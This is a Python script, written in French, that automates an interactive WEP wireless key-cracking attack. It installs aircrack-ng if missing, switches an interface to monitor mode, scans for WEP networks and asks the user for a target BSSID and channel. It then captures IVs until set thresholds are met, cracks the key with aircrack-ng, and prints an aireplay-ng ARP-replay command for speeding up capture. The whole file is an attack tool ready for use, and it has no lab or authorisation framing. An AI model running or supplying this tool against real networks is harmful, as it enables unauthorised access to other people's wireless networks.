import subprocess
import os
import sys
import time
import re
# remember to add the option of the attack for wpa and wep for now the attack target only wep

# ============================================================
# Fonction run() intégrée
# ============================================================
def run(cmd, background=False, capture=True):
    """Exécute une commande shell et retourne le code de retour."""
    try:
        if background:
            subprocess.Popen(cmd, shell=True,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
            return 0
        result = subprocess.run(
            cmd, shell=True, text=True,
            stdout=subprocess.PIPE if capture else None,
            stderr=subprocess.PIPE if capture else None
        )
        if capture and result.stdout:
            print(result.stdout.strip())
        return result.returncode
    except Exception as e:
        print(f"[-] Erreur : {e}")
        return 1


# ============================================================
# Fonctions interactives utilitaires
# ============================================================

def ask(prompt, default=None, validator=None):
    """Pose une question avec valeur par défaut et validation."""
    while True:
        if default is not None:
            answer = input(f"{prompt} [{default}] : ").strip()
            if answer == "":
                answer = default
        else:
            answer = input(f"{prompt} : ").strip()

        if validator:
            if validator(answer):
                return answer
            print("[-] Valeur invalide, réessayez.")
        else:
            return answer


def list_interfaces():
    """Affiche les interfaces réseau disponibles."""
    print("\n[i] Interfaces réseau disponibles :")
    result = subprocess.run(
        "ip -o link show | awk -F': ' '{print $2}' | grep -v lo",
        shell=True, capture_output=True, text=True
    )
    print(result.stdout.strip())
    print()


def check_tools():
    """Vérifie que les outils nécessaires sont installés."""
    tools = ["airmon-ng", "airodump-ng", "aircrack-ng", "aireplay-ng", "iw"]
    missing = []
    for tool in tools:
        if subprocess.run(f"which {tool}", shell=True, capture_output=True).returncode != 0:
            missing.append(tool)

    if missing:
        print(f"[-] Outils manquants : {', '.join(missing)}")
        install = input("Installer aircrack-ng et iw ? (o/n) : ").strip().lower()
        if install == "o":
            run("apt-get update && apt-get install -y aircrack-ng iw")
        else:
            print("[-] Impossible de continuer sans ces outils.")
            sys.exit(1)


# ============================================================
# Attaque WEP
# ============================================================

def configure_monitor_mode(monitor_interface):
    """Configure une interface en mode monitor."""
    print(f"[*] Configuration du mode monitor sur {monitor_interface}...")

    if run(f"iw dev {monitor_interface} info", capture=False) != 0:
        print(f"[-] L'interface {monitor_interface} n'existe pas.")
        return False

    run(f"ip link set {monitor_interface} down", capture=False)
    if run(f"iw dev {monitor_interface} set type monitor", capture=False) != 0:
        print(f"[-] Impossible de passer {monitor_interface} en mode monitor.")
        return False
    run(f"ip link set {monitor_interface} up", capture=False)

    print(f"[+] {monitor_interface} est maintenant en mode monitor.")
    return True


def show_networks_wep(monitor_interface):
    """Scan des réseaux WEP (Ctrl+C pour arrêter)."""
    print(f"\n[*] Scan des réseaux WEP sur {monitor_interface}...")
    print("[i] Appuyez sur Ctrl+C pour arrêter le scan.")
    print("[i] Notez le BSSID et le canal du réseau cible.\n")
    try:
        subprocess.run(f"airodump-ng --encrypt WEP {monitor_interface}", shell=True)
    except KeyboardInterrupt:
        print("\n[+] Scan interrompu.")


def choose_target(channel, bssid, monitor_interface, output_file):
    """Capture les IVs jusqu'à en avoir assez (>=5000 IVs, >=60000 data)."""
    print(f"\n[*] Ciblage du réseau {bssid} (canal {channel})...")
    print(f"[*] Captures dans {output_file}*.cap")

    run(f"rm -f {output_file}-*.cap {output_file}-*.csv {output_file}-*.kismet.netxml", capture=False)

    cmd = (
        f"airodump-ng --channel {channel} --bssid {bssid} "
        f"--write {output_file} {monitor_interface}"
    )
    run(cmd, background=True)

    print("[i] Capture en cours. En attente d'IVs suffisants (Ctrl+C pour arrêter)...\n")

    cap_file = None
    try:
        while True:
            time.sleep(5)
            for f in os.listdir("."):
                if f.startswith(output_file) and f.endswith(".cap"):
                    cap_file = f
                    break
            if cap_file is None:
                print("[i] En attente du fichier .cap...")
                continue

            subprocess.run(
                f"aircrack-ng {cap_file} > /tmp/aircrack_out.txt 2>&1",
                shell=True
            )
            with open("/tmp/aircrack_out.txt", "r") as f:
                output = f.read()

            ivs_match = re.search(r"(\d+)\s+IVs", output)
            data_match = re.search(r"(\d+)#Data", output)
            ivs = int(ivs_match.group(1)) if ivs_match else 0
            data = int(data_match.group(1)) if data_match else 0

            print(f"[i] IVs: {ivs} | Data: {data}")

            if ivs >= 5000 and data >= 60000:
                print(f"[+] Suffisamment d'IVs collectés ({ivs} IVs, {data} data).")
                break
    except KeyboardInterrupt:
        print("\n[+] Capture interrompue par l'utilisateur.")

    run("pkill airodump-ng", capture=False)
    print("[+] Capture terminée.")
    return cap_file


def crack_wep_net(pcap_file):
    """Casse la clé WEP via aircrack-ng."""
    print(f"\n[*] Cassage de la clé WEP à partir de {pcap_file}...")
    result = subprocess.run(f"aircrack-ng {pcap_file}", shell=True)
    if result.returncode != 0:
        print("[-] aircrack-ng n'a pas pu casser la clé (pas assez d'IVs ?).")
        return None
    print("[+] Clé trouvée !")
    return True


# ============================================================
# Menu interactif
# ============================================================

def main():
    if os.geteuid() != 0:
        print("[-] Ce script doit être exécuté en tant que root (sudo).")
        sys.exit(1)

    print("=" * 50)
    print("   Attaque interactive WEP")
    print("=" * 50)

    # 0. Vérifier les outils
    check_tools()

    # 1. Interface monitor
    list_interfaces()
    monitor_interface = ask(
        "Interface en mode monitor (ex: wlan1mon ou wlan1)",
        default="wlan1mon",
        validator=lambda x: os.path.exists(f"/sys/class/net/{x}")
    )
    if not configure_monitor_mode(monitor_interface):
        sys.exit(1)

    # 2. Scan
    print("\n=== Étape 2 : Scan des réseaux WEP ===")
    show_networks_wep(monitor_interface)

    # 3. Sélection de la cible
    print("\n=== Étape 3 : Sélection de la cible ===")
    bssid = ask(
        "BSSID du réseau cible (ex: 00:11:22:33:44:55)",
        validator=lambda x: re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", x) is not None
    )
    channel = ask(
        "Canal du réseau cible (1-14)",
        validator=lambda x: x.isdigit() and 1 <= int(x) <= 14
    )
    output_file = ask("Nom du fichier de capture", default="wep_capture")

    # 4. Capture
    print(f"\n=== Étape 4 : Capture sur {bssid} (canal {channel}) ===")
    cap_file = choose_target(int(channel), bssid, monitor_interface, output_file)
    if cap_file is None:
        print("[-] Aucune capture trouvée. Vérifiez que le réseau est actif.")
        sys.exit(1)

    # 5. Cassage
    print("\n=== Étape 5 : Cassage de la clé WEP ===")
    success = crack_wep_net(cap_file)

    if success:
        print("\n[+] Attaque réussie !")
    else:
        print("\n[-] Attaque échouée. Essayez de capturer plus d'IVs.")
        print("[i] Astuce : utilisez aireplay-ng en parallèle pour accélérer :")
        print(f"    sudo aireplay-ng --arpreplay -b {bssid} -h <MAC_client> {monitor_interface}")

    # 6. cassage de la cle WPA-PSK ( crackage avec Hashcat mode 22000)

if __name__ == "__main__":
    main()
